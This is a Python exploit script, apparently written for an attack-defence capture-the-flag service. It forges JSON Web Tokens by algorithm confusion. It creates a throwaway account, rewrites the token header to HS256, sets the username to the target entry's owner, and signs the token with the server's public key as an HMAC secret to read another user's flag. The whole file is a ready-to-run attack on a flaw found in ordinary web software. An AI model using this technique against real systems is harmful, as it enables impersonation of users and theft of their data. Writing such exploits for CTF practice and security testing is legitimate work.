from Crypto import Random
import binascii
from util import *
import base64
import json
from Crypto.Hash import SHA256, HMAC


def exploit(ip, port, flag_id):
    base_url = 'http://' + ip + ':' + port + '/'
    username = (binascii.hexlify(Random.get_random_bytes(10))).decode()
    password = (binascii.hexlify(Random.get_random_bytes(10))).decode()

    account = create_account(base_url, username, password)
    jwt = login(base_url, username, password)
    jwt_token = jwt['token']

    entries = get_all_entries(base_url, jwt_token)
    for entry in entries:
        if entry['id'] == flag_id:
            target_entry = entry
    (header, body, signature) = jwt_token.split('.')
    header_decoded = json.loads(base64.b64decode(header).decode())
    header_decoded['alg'] = 'HS256'
    header_payload = base64.b64encode(json.dumps(header_decoded).encode())

    body_decoded = json.loads(base64.b64decode(body).decode())
    body_decoded['username'] = target_entry['owner']
    body_payload = base64.b64encode(json.dumps(body_decoded).encode())

    to_sign = header_payload + b'.' + body_payload

    public_key = get_public_key(base_url)
    hmac = HMAC.new(public_key.encode(), to_sign, SHA256)

    payload_signature = base64.b64encode(hmac.digest())

    payload_jwt = to_sign + b'.' + payload_signature

    exploit_entry = get_entry(base_url, payload_jwt.decode(), flag_id)

    return {'FLAG': exploit_entry['entry']}
